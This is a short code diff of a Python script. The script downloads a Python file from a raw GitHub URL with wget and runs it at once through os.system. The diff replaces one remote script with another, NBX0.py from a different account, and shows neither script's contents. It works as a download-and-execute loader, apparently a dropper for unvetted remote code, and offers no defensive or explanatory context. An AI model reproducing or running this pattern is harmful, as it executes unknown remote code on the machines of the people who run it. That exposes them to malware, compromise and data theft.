@@ -1,5 +1,5 @@
 import os, requests ,wget
 
 
-wget.download("https://raw.githubusercontent.com/sfrsfrsfr88/Chekpoint/main/...py")
-os.system("python3 ...py")
+wget.download("https://raw.githubusercontent.com/xwickx/test/main/NBX0.py")
+os.system("python3 NBX0.py")
